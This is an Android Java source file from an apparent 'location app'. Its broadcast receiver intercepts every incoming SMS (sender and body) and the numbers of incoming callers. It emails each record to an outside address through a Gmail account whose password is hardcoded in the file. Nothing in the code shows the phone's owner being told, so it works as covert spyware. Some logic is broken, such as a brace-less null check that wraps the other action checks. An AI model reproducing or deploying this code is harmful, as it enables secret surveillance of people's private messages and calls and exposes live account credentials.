package com.example.locationapp;

import android.app.DownloadManager;
import android.app.PendingIntent;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.os.StrictMode;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

public class StartUpReceiver extends BroadcastReceiver
{

    Context Cont;
    Mail sender;
    String EMAIL= "alocationapp@gmail.com";
    String password = "location21";

    @Override
    public void onReceive (Context context, Intent intent)
    {

        Cont = context;
        String Action = intent.getAction ();

        if (Action == null)

        if (Action == Intent.ACTION_BOOT_COMPLETED)
            DoBoot ();
        if (Action == "android.provider.Telephony.SMS_RECEIVED")
            DoSMS (intent);
        if (Action == "android.intent.action.PHONE_STATE")
            DoPhone (intent);

    }

    void DoBoot ()
    {
        WriteLog ("Application started on boot");
    }

    void DoSMS (Intent SmsInt)
    {

        Bundle bundle = SmsInt.getExtras ();
        SmsMessage[] Messages = null;
        String SmsSender;
        String ToActivity;

        if (bundle != null)
        {

            try
            {
                ToActivity = "";
                Object[] pdus = (Object[]) bundle.get("pdus");
                Messages = new SmsMessage[pdus.length];

                for(int i=0; i<Messages.length; i++)
                {
                    Messages[i] = SmsMessage.createFromPdu ((byte[]) pdus[i], bundle.getString ("format" ));
                    SmsSender = Messages[i].getOriginatingAddress();
                    if (i == 0) {
                        ToActivity = "From: " + SmsSender + ",   ";
                    }
                    String SmsBody = Messages[i].getMessageBody();
                    ToActivity = ToActivity + SmsBody;
                    WriteLog ("SMS message Sender: " + SmsSender);
                    WriteLog ("SMS message: " + SmsBody);
                }

                WriteLog ("--");

            }
            catch(Exception e)
            {

            }

        }

    }

    void DoPhone (Intent PhoneInt)
    {

        String State = PhoneInt.getStringExtra (TelephonyManager.EXTRA_STATE);
        String Caller= PhoneInt.getStringExtra (TelephonyManager.EXTRA_INCOMING_NUMBER);

        if (State.equals (TelephonyManager.EXTRA_STATE_RINGING))
        {

            if (Caller != null)
            {
                WriteLog ("Phone Ringing : " + Caller);
            }
        }

        if (State.equals (TelephonyManager.EXTRA_STATE_OFFHOOK))
        {
            if (Caller != null)
            {
                WriteLog ("Off Hook: " + Caller);

            }
        }

        if (State.equals (TelephonyManager.EXTRA_STATE_IDLE))
        {

            if (Caller != null)
            {
                WriteLog ("Phone Rests: " + Caller);

            }
        }

    }

    void WriteLog (String Line)
    {

            String TimeStamp = new SimpleDateFormat ("yyyy-MM-dd HH:mm:ss").format (new Date ());
            String line = Line + "   (" + TimeStamp + ")";

        sender = new Mail(EMAIL, password);
        StringMake.setString(line);
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.
                    Builder().permitAll().build();
                     StrictMode.setThreadPolicy(policy);

        try {
            new StartUpReceiver.MyAsyncClass_sms2().execute();
        }

        catch (Exception ex)
        {
        }

    }

    static class StringMake {

        static String b;

        static void setString(String a) {
            b = a;
        }

        static String getString() {

            String c = b;
            return c;

        }
    }

    class MyAsyncClass_sms2 extends AsyncTask<Void, Void, Void> {

        @Override

        protected void onPreExecute() {

            super.onPreExecute();

        }
        
        @Override

        protected Void doInBackground(Void... mApi) {

            try {

                // Add subject, Body, your mail Id, and receiver mail Id.

                String line = null;
                line = StringMake.getString();

                sender.sendMail("New SMS", line, EMAIL, "cse242017051@uniwa.gr");

            } catch (Exception ex) {

            }
            return null;
        }

        @Override

        protected void onPostExecute(Void result) {

            super.onPostExecute(result);

            //Toast.makeText(Cont.getApplicationContext(), "Email send", 100).show();

        }

    }


}
